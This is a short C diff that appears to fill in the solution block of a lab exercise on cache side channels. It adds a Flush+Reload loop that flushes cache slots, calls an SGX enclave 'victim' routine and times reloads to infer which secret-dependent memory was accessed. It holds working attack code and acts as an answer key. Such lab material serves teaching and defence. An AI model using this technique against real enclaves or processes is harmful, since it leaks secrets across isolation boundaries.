@@ -31,10 +31,20 @@ int main( int argc, char **argv )
     /* ---------------------------------------------------------------------- */
     info_event("calling victim...");
 
-    /* Example victim invocation */
-    ecall_secret_lookup(array, ARRAY_LEN);
-
     /* =========================== START SOLUTION =========================== */
+    for (i=0; i < NUM_SAMPLES; i++)
+    {
+        /* 1. Flush */
+        for (j=0; j < NUM_SLOTS; j++)
+            flush(&GET_SLOT(j));
+
+        /* 2. Victim exec */
+        ecall_secret_lookup(array, ARRAY_LEN);
+
+        /* 3. Reload */
+        for (j=0; j < NUM_SLOTS; j++)
+            tsc[j][i] = reload(&GET_SLOT(j));
+    }
     /* =========================== END SOLUTION =========================== */
 
     for (j=0; j < NUM_SLOTS; j++)
